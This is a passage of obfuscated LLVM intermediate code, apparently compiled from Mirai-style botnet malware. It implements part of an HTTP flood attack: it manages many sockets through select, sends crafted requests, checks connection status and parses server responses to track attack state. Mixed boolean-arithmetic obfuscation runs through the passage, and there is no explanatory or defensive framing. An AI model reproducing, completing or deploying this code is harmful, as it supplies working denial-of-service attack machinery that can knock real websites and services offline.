  %793 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %794 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %795 = call i32 @util_strlen(i8* %794)
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds i8, i8* %793, i64 %796
  %798 = load i8*, i8** %14, align 8
  %799 = call i32 @util_strcpy(i8* %797, i8* %798)
  br label %800

; <label>:800:                                    ; preds = %792, %783
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 9
  %803 = getelementptr inbounds [9 x i8], [9 x i8]* %802, i32 0, i32 0
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 10
  %806 = getelementptr inbounds [9 x i8], [9 x i8]* %805, i32 0, i32 0
  %807 = call signext i8 @util_strcmp(i8* %803, i8* %806)
  %808 = icmp ne i8 %807, 0
  br i1 %808, label %817, label %809

; <label>:809:                                    ; preds = %800
  %810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %810, i32 0, i32 9
  %812 = getelementptr inbounds [9 x i8], [9 x i8]* %811, i32 0, i32 0
  %813 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %814 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %813, i32 0, i32 10
  %815 = getelementptr inbounds [9 x i8], [9 x i8]* %814, i32 0, i32 0
  %816 = call i32 @util_strcpy(i8* %812, i8* %815)
  br label %817

; <label>:817:                                    ; preds = %809, %800
  %818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %818, i32 0, i32 0
  %820 = load i32, i32* %819, align 4
  %821 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %822 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %823 = call i32 @util_strlen(i8* %822)
  %824 = sext i32 %823 to i64
  %825 = call i64 @send(i32 %820, i8* %821, i64 %824, i32 16384)
  %826 = load i32, i32* %27, align 4
  %827 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %827, i32 0, i32 3
  store i32 %826, i32* %828, align 4
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 1
  store i8 6, i8* %830, align 4
  %831 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %832 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %831, i32 0, i32 0
  %833 = load i32, i32* %832, align 4
  %834 = srem i32 %833, 64
  %835 = zext i32 %834 to i64
  %836 = shl i64 1, %835
  %837 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %838 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %839 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %838, i32 0, i32 0
  %840 = load i32, i32* %839, align 4
  %841 = sdiv i32 %840, 64
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds [16 x i64], [16 x i64]* %837, i64 0, i64 %842
  %844 = load i64, i64* %843, align 8
  %845 = xor i64 %844, -1
  %846 = xor i64 %836, -1
  %847 = xor i64 3497682569437049059, -1
  %848 = and i64 %845, 3497682569437049059
  %849 = and i64 %844, %847
  %850 = and i64 %846, 3497682569437049059
  %851 = and i64 %836, %847
  %852 = or i64 %848, %849
  %853 = or i64 %850, %851
  %854 = xor i64 %852, %853
  %855 = or i64 %845, %846
  %856 = xor i64 %855, -1
  %857 = or i64 3497682569437049059, %847
  %858 = and i64 %856, %857
  %859 = or i64 %854, %858
  %860 = or i64 %844, %836
  store i64 %859, i64* %843, align 8
  %861 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %861, i32 0, i32 0
  %863 = load i32, i32* %862, align 4
  %864 = load i32, i32* %23, align 4
  %865 = icmp sgt i32 %863, %864
  br i1 %865, label %866, label %875

; <label>:866:                                    ; preds = %817
  %867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %867, i32 0, i32 0
  %869 = load i32, i32* %868, align 4
  %870 = sub i32 0, %869
  %871 = sub i32 0, 1
  %872 = add i32 %870, %871
  %873 = sub i32 0, %872
  %874 = add nsw i32 %869, 1
  store i32 %873, i32* %23, align 4
  br label %875

; <label>:875:                                    ; preds = %866, %817
  br label %1044

; <label>:876:                                    ; preds = %575
  %877 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %878 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %877, i32 0, i32 1
  %879 = load i8, i8* %878, align 4
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 6
  br i1 %881, label %882, label %926

; <label>:882:                                    ; preds = %876
  %883 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %883, i32 0, i32 0
  %885 = load i32, i32* %884, align 4
  %886 = srem i32 %885, 64
  %887 = zext i32 %886 to i64
  %888 = shl i64 1, %887
  %889 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %890, i32 0, i32 0
  %892 = load i32, i32* %891, align 4
  %893 = sdiv i32 %892, 64
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds [16 x i64], [16 x i64]* %889, i64 0, i64 %894
  %896 = load i64, i64* %895, align 8
  %897 = xor i64 %896, -1
  %898 = xor i64 %888, -1
  %899 = xor i64 -1587405378568886015, -1
  %900 = and i64 %897, -1587405378568886015
  %901 = and i64 %896, %899
  %902 = and i64 %898, -1587405378568886015
  %903 = and i64 %888, %899
  %904 = or i64 %900, %901
  %905 = or i64 %902, %903
  %906 = xor i64 %904, %905
  %907 = or i64 %897, %898
  %908 = xor i64 %907, -1
  %909 = or i64 -1587405378568886015, %899
  %910 = and i64 %908, %909
  %911 = or i64 %906, %910
  %912 = or i64 %896, %888
  store i64 %911, i64* %895, align 8
  %913 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %914 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %913, i32 0, i32 0
  %915 = load i32, i32* %914, align 4
  %916 = load i32, i32* %23, align 4
  %917 = icmp sgt i32 %915, %916
  br i1 %917, label %918, label %925

; <label>:918:                                    ; preds = %882
  %919 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %920 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %919, i32 0, i32 0
  %921 = load i32, i32* %920, align 4
  %922 = sub i32 0, 1
  %923 = sub i32 %921, %922
  %924 = add nsw i32 %921, 1
  store i32 %923, i32* %23, align 4
  br label %925

; <label>:925:                                    ; preds = %918, %882
  br label %1043

; <label>:926:                                    ; preds = %876
  %927 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %928 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %927, i32 0, i32 1
  %929 = load i8, i8* %928, align 4
  %930 = zext i8 %929 to i32
  %931 = icmp eq i32 %930, 7
  br i1 %931, label %932, label %976

; <label>:932:                                    ; preds = %926
  %933 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %934 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %933, i32 0, i32 0
  %935 = load i32, i32* %934, align 4
  %936 = srem i32 %935, 64
  %937 = zext i32 %936 to i64
  %938 = shl i64 1, %937
  %939 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %940 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %941 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %940, i32 0, i32 0
  %942 = load i32, i32* %941, align 4
  %943 = sdiv i32 %942, 64
  %944 = sext i32 %943 to i64
  %945 = getelementptr inbounds [16 x i64], [16 x i64]* %939, i64 0, i64 %944
  %946 = load i64, i64* %945, align 8
  %947 = xor i64 %946, -1
  %948 = xor i64 %938, -1
  %949 = xor i64 -1262665493654027302, -1
  %950 = and i64 %947, -1262665493654027302
  %951 = and i64 %946, %949
  %952 = and i64 %948, -1262665493654027302
  %953 = and i64 %938, %949
  %954 = or i64 %950, %951
  %955 = or i64 %952, %953
  %956 = xor i64 %954, %955
  %957 = or i64 %947, %948
  %958 = xor i64 %957, -1
  %959 = or i64 -1262665493654027302, %949
  %960 = and i64 %958, %959
  %961 = or i64 %956, %960
  %962 = or i64 %946, %938
  store i64 %961, i64* %945, align 8
  %963 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %963, i32 0, i32 0
  %965 = load i32, i32* %964, align 4
  %966 = load i32, i32* %23, align 4
  %967 = icmp sgt i32 %965, %966
  br i1 %967, label %968, label %975

; <label>:968:                                    ; preds = %932
  %969 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %969, i32 0, i32 0
  %971 = load i32, i32* %970, align 4
  %972 = sub i32 0, 1
  %973 = sub i32 %971, %972
  %974 = add nsw i32 %971, 1
  store i32 %973, i32* %23, align 4
  br label %975

; <label>:975:                                    ; preds = %968, %932
  br label %1042

; <label>:976:                                    ; preds = %926
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 1
  %979 = load i8, i8* %978, align 4
  %980 = zext i8 %979 to i32
  %981 = icmp eq i32 %980, 10
  br i1 %981, label %982, label %1016

; <label>:982:                                    ; preds = %976
  %983 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %983, i32 0, i32 0
  %985 = load i32, i32* %984, align 4
  %986 = srem i32 %985, 64
  %987 = zext i32 %986 to i64
  %988 = shl i64 1, %987
  %989 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %990 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %990, i32 0, i32 0
  %992 = load i32, i32* %991, align 4
  %993 = sdiv i32 %992, 64
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds [16 x i64], [16 x i64]* %989, i64 0, i64 %994
  %996 = load i64, i64* %995, align 8
  %997 = and i64 %996, %988
  %998 = xor i64 %996, %988
  %999 = or i64 %997, %998
  %1000 = or i64 %996, %988
  store i64 %999, i64* %995, align 8
  %1001 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1002 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1001, i32 0, i32 0
  %1003 = load i32, i32* %1002, align 4
  %1004 = load i32, i32* %23, align 4
  %1005 = icmp sgt i32 %1003, %1004
  br i1 %1005, label %1006, label %1015

; <label>:1006:                                   ; preds = %982
  %1007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1007, i32 0, i32 0
  %1009 = load i32, i32* %1008, align 4
  %1010 = sub i32 0, %1009
  %1011 = sub i32 0, 1
  %1012 = add i32 %1010, %1011
  %1013 = sub i32 0, %1012
  %1014 = add nsw i32 %1009, 1
  store i32 %1013, i32* %23, align 4
  br label %1015

; <label>:1015:                                   ; preds = %1006, %982
  br label %1041

; <label>:1016:                                   ; preds = %976
  %1017 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1018 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1017, i32 0, i32 1
  %1019 = load i8, i8* %1018, align 4
  %1020 = zext i8 %1019 to i32
  %1021 = icmp eq i32 %1020, 11
  br i1 %1021, label %1022, label %1031

; <label>:1022:                                   ; preds = %1016
  %1023 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1024 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1023, i32 0, i32 1
  store i8 0, i8* %1024, align 4
  %1025 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1026 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1025, i32 0, i32 0
  %1027 = load i32, i32* %1026, align 4
  %1028 = call i32 @close(i32 %1027)
  %1029 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1030 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1029, i32 0, i32 0
  store i32 -1, i32* %1030, align 4
  br label %1040

; <label>:1031:                                   ; preds = %1016
  %1032 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1033 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1032, i32 0, i32 1
  store i8 0, i8* %1033, align 4
  %1034 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1035 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 4
  %1037 = call i32 @close(i32 %1036)
  %1038 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1039 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1038, i32 0, i32 0
  store i32 -1, i32* %1039, align 4
  br label %1040

; <label>:1040:                                   ; preds = %1031, %1022
  br label %1041

; <label>:1041:                                   ; preds = %1040, %1015
  br label %1042

; <label>:1042:                                   ; preds = %1041, %975
  br label %1043

; <label>:1043:                                   ; preds = %1042, %925
  br label %1044

; <label>:1044:                                   ; preds = %1043, %875
  br label %1045

; <label>:1045:                                   ; preds = %1044, %574
  br label %1046

; <label>:1046:                                   ; preds = %1045, %516
  br label %1047

; <label>:1047:                                   ; preds = %1046, %533, %432
  %1048 = load i32, i32* %9, align 4
  %1049 = add i32 %1048, -1405347644
  %1050 = add i32 %1049, 1
  %1051 = sub i32 %1050, -1405347644
  %1052 = add nsw i32 %1048, 1
  store i32 %1051, i32* %9, align 4
  br label %384

; <label>:1053:                                   ; preds = %384
  %1054 = load i32, i32* %23, align 4
  %1055 = icmp eq i32 %1054, 0
  br i1 %1055, label %1056, label %1057

; <label>:1056:                                   ; preds = %1053
  br label %361

; <label>:1057:                                   ; preds = %1053
  %1058 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1058, align 8
  %1059 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1059, align 8
  %1060 = load i32, i32* %23, align 4
  %1061 = call i32 @select(i32 %1060, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1061, i32* %24, align 4
  %1062 = call i64 @time(i64* null) #6
  %1063 = trunc i64 %1062 to i32
  store i32 %1063, i32* %27, align 4
  %1064 = load i32, i32* %24, align 4
  %1065 = icmp slt i32 %1064, 1
  br i1 %1065, label %1066, label %1067

; <label>:1066:                                   ; preds = %1057
  br label %361

; <label>:1067:                                   ; preds = %1057
  store i32 0, i32* %9, align 4
  br label %1068

; <label>:1068:                                   ; preds = %2797, %1067
  %1069 = load i32, i32* %9, align 4
  %1070 = load i32, i32* %18, align 4
  %1071 = icmp slt i32 %1069, %1070
  br i1 %1071, label %1072, label %2802

; <label>:1072:                                   ; preds = %1068
  %1073 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1074 = load i32, i32* %9, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1073, i64 %1075
  store %struct.attack_http_state* %1076, %struct.attack_http_state** %26, align 8
  %1077 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1078 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1077, i32 0, i32 0
  %1079 = load i32, i32* %1078, align 4
  %1080 = icmp eq i32 %1079, -1
  br i1 %1080, label %1081, label %1082

; <label>:1081:                                   ; preds = %1072
  br label %2797

; <label>:1082:                                   ; preds = %1072
  %1083 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1084 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1085 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1084, i32 0, i32 0
  %1086 = load i32, i32* %1085, align 4
  %1087 = sdiv i32 %1086, 64
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds [16 x i64], [16 x i64]* %1083, i64 0, i64 %1088
  %1090 = load i64, i64* %1089, align 8
  %1091 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1092 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1091, i32 0, i32 0
  %1093 = load i32, i32* %1092, align 4
  %1094 = srem i32 %1093, 64
  %1095 = zext i32 %1094 to i64
  %1096 = shl i64 1, %1095
  %1097 = xor i64 %1090, -1
  %1098 = xor i64 %1096, -1
  %1099 = xor i64 -2189440026985791319, -1
  %1100 = or i64 %1097, %1098
  %1101 = or i64 -2189440026985791319, %1099
  %1102 = xor i64 %1100, -1
  %1103 = and i64 %1102, %1101
  %1104 = and i64 %1090, %1096
  %1105 = icmp ne i64 %1103, 0
  br i1 %1105, label %1106, label %1130

; <label>:1106:                                   ; preds = %1082
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1107, i32 0, i32 0
  %1109 = load i32, i32* %1108, align 4
  %1110 = bitcast i32* %35 to i8*
  %1111 = call i32 @getsockopt(i32 %1109, i32 1, i32 4, i8* %1110, i32* %36) #6
  store i32 %1111, i32* %12, align 4
  %1112 = load i32, i32* %35, align 4
  %1113 = icmp eq i32 %1112, 0
  br i1 %1113, label %1114, label %1120

; <label>:1114:                                   ; preds = %1106
  %1115 = load i32, i32* %12, align 4
  %1116 = icmp eq i32 %1115, 0
  br i1 %1116, label %1117, label %1120

; <label>:1117:                                   ; preds = %1114
  %1118 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1118, i32 0, i32 1
  store i8 4, i8* %1119, align 4
  br label %1129

; <label>:1120:                                   ; preds = %1114, %1106
  %1121 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 4
  %1124 = call i32 @close(i32 %1123)
  %1125 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1126 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1125, i32 0, i32 0
  store i32 -1, i32* %1126, align 4
  %1127 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1128 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1127, i32 0, i32 1
  store i8 0, i8* %1128, align 4
  br label %2797

; <label>:1129:                                   ; preds = %1117
  br label %1130

; <label>:1130:                                   ; preds = %1129, %1082
  %1131 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1132, i32 0, i32 0
  %1134 = load i32, i32* %1133, align 4
  %1135 = sdiv i32 %1134, 64
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds [16 x i64], [16 x i64]* %1131, i64 0, i64 %1136
  %1138 = load i64, i64* %1137, align 8
  %1139 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1139, i32 0, i32 0
  %1141 = load i32, i32* %1140, align 4
  %1142 = srem i32 %1141, 64
  %1143 = zext i32 %1142 to i64
  %1144 = shl i64 1, %1143
  %1145 = xor i64 %1138, -1
  %1146 = xor i64 %1144, -1
  %1147 = xor i64 1458022670345246621, -1
  %1148 = or i64 %1145, %1146
  %1149 = or i64 1458022670345246621, %1147
  %1150 = xor i64 %1148, -1
  %1151 = and i64 %1150, %1149
  %1152 = and i64 %1138, %1144
  %1153 = icmp ne i64 %1151, 0
  br i1 %1153, label %1154, label %2796

; <label>:1154:                                   ; preds = %1130
  %1155 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1156 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1155, i32 0, i32 1
  %1157 = load i8, i8* %1156, align 4
  %1158 = zext i8 %1157 to i32
  %1159 = icmp eq i32 %1158, 6
  br i1 %1159, label %1160, label %2311

; <label>:1160:                                   ; preds = %1154
  store i32 0, i32* %37, align 4
  %1161 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1161, i32 10240)
  %1162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1162, i32 0, i32 0
  %1164 = load i32, i32* %1163, align 4
  %1165 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1166 = call i64 @recv(i32 %1164, i8* %1165, i64 10240, i32 16386)
  %1167 = trunc i64 %1166 to i32
  store i32 %1167, i32* %12, align 4
  %1168 = icmp slt i32 %1167, 1
  br i1 %1168, label %1169, label %1178

; <label>:1169:                                   ; preds = %1160
  %1170 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1170, i32 0, i32 0
  %1172 = load i32, i32* %1171, align 4
  %1173 = call i32 @close(i32 %1172)
  %1174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1174, i32 0, i32 0
  store i32 -1, i32* %1175, align 4
  %1176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1176, i32 0, i32 1
  store i8 0, i8* %1177, align 4
  br label %2797

; <label>:1178:                                   ; preds = %1160
  %1179 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1180 = load i32, i32* %12, align 4
  %1181 = call i32 @util_memsearch(i8* %1179, i32 %1180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1182 = icmp eq i32 %1181, -1
  br i1 %1182, label %1183, label %1187

; <label>:1183:                                   ; preds = %1178
  %1184 = load i32, i32* %12, align 4
  %1185 = icmp slt i32 %1184, 10240
  br i1 %1185, label %1186, label %1187

; <label>:1186:                                   ; preds = %1183
  br label %2797

; <label>:1187:                                   ; preds = %1183, %1178
  %1188 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1189 = load i32, i32* %12, align 4
  %1190 = call i32 @util_memsearch(i8* %1188, i32 %1189, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1191
  store i8 0, i8* %1192, align 1
  %1193 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1194 = load i32, i32* %12, align 4
  %1195 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1196 = call i32 @util_stristr(i8* %1193, i32 %1194, i8* %1195)
  %1197 = icmp ne i32 %1196, -1
  br i1 %1197, label %1198, label %1201

; <label>:1198:                                   ; preds = %1187
  %1199 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1199, i32 0, i32 11
  store i32 2, i32* %1200, align 4
  br label %1201

; <label>:1201:                                   ; preds = %1198, %1187
  %1202 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1203 = load i32, i32* %12, align 4
  %1204 = call i8* @table_retrieve_val(i32 61, i32* null)
  %1205 = call i32 @util_stristr(i8* %1202, i32 %1203, i8* %1204)
  %1206 = icmp ne i32 %1205, -1
  br i1 %1206, label %1207, label %1210

; <label>:1207:                                   ; preds = %1201
  %1208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1208, i32 0, i32 11
  store i32 1, i32* %1209, align 4
  br label %1210

; <label>:1210:                                   ; preds = %1207, %1201
  %1211 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1211, i32 0, i32 12
  store i32 0, i32* %1212, align 4
  %1213 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1214 = load i32, i32* %12, align 4
  %1215 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1216 = call i32 @util_stristr(i8* %1213, i32 %1214, i8* %1215)
  %1217 = icmp ne i32 %1216, -1
  br i1 %1217, label %1218, label %1280

; <label>:1218:                                   ; preds = %1210
  %1219 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1220 = load i32, i32* %12, align 4
  %1221 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1222 = call i32 @util_stristr(i8* %1219, i32 %1220, i8* %1221)
  store i32 %1222, i32* %38, align 4
  %1223 = load i32, i32* %38, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1224
  %1226 = load i8, i8* %1225, align 1
  %1227 = sext i8 %1226 to i32
  %1228 = icmp eq i32 %1227, 32
  br i1 %1228, label %1229, label %1235

; <label>:1229:                                   ; preds = %1218
  %1230 = load i32, i32* %38, align 4
  %1231 = sub i32 %1230, 1214706485
  %1232 = add i32 %1231, 1
  %1233 = add i32 %1232, 1214706485
  %1234 = add nsw i32 %1230, 1
  store i32 %1233, i32* %38, align 4
  br label %1235

; <label>:1235:                                   ; preds = %1229, %1218
  %1236 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1237 = load i32, i32* %38, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds i8, i8* %1236, i64 %1238
  %1240 = load i32, i32* %12, align 4
  %1241 = load i32, i32* %38, align 4
  %1242 = sub i32 0, %1241
  %1243 = add i32 %1240, %1242
  %1244 = sub nsw i32 %1240, %1241
  %1245 = call i32 @util_memsearch(i8* %1239, i32 %1243, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1245, i32* %39, align 4
  %1246 = load i32, i32* %39, align 4
  %1247 = icmp ne i32 %1246, -1
  br i1 %1247, label %1248, label %1279

; <label>:1248:                                   ; preds = %1235
  %1249 = load i32, i32* %38, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1250
  store i8* %1251, i8** %40, align 8
  %1252 = load i32, i32* %39, align 4
  %1253 = icmp sge i32 %1252, 2
  br i1 %1253, label %1254, label %1260

; <label>:1254:                                   ; preds = %1248
  %1255 = load i32, i32* %39, align 4
  %1256 = add i32 %1255, 71142015
  %1257 = sub i32 %1256, 2
  %1258 = sub i32 %1257, 71142015
  %1259 = sub nsw i32 %1255, 2
  store i32 %1258, i32* %39, align 4
  br label %1260

; <label>:1260:                                   ; preds = %1254, %1248
  %1261 = load i32, i32* %38, align 4
  %1262 = load i32, i32* %39, align 4
  %1263 = add i32 %1261, 1877675643
  %1264 = add i32 %1263, %1262
  %1265 = sub i32 %1264, 1877675643
  %1266 = add nsw i32 %1261, %1262
  %1267 = sext i32 %1265 to i64
  %1268 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1267
  store i8 0, i8* %1268, align 1
  %1269 = load i8*, i8** %40, align 8
  %1270 = load i8*, i8** %40, align 8
  %1271 = call i32 @util_strlen(i8* %1270)
  %1272 = call i8* @table_retrieve_val(i32 59, i32* null)
  %1273 = call i32 @util_stristr(i8* %1269, i32 %1271, i8* %1272)
  %1274 = icmp ne i32 %1273, 0
  br i1 %1274, label %1275, label %1278

; <label>:1275:                                   ; preds = %1260
  %1276 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1277 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1276, i32 0, i32 12
  store i32 1, i32* %1277, align 4
  br label %1278

; <label>:1278:                                   ; preds = %1275, %1260
  br label %1279

; <label>:1279:                                   ; preds = %1278, %1235
  br label %1280

; <label>:1280:                                   ; preds = %1279, %1210
  %1281 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1281, i32 0, i32 13
  store i32 0, i32* %1282, align 4
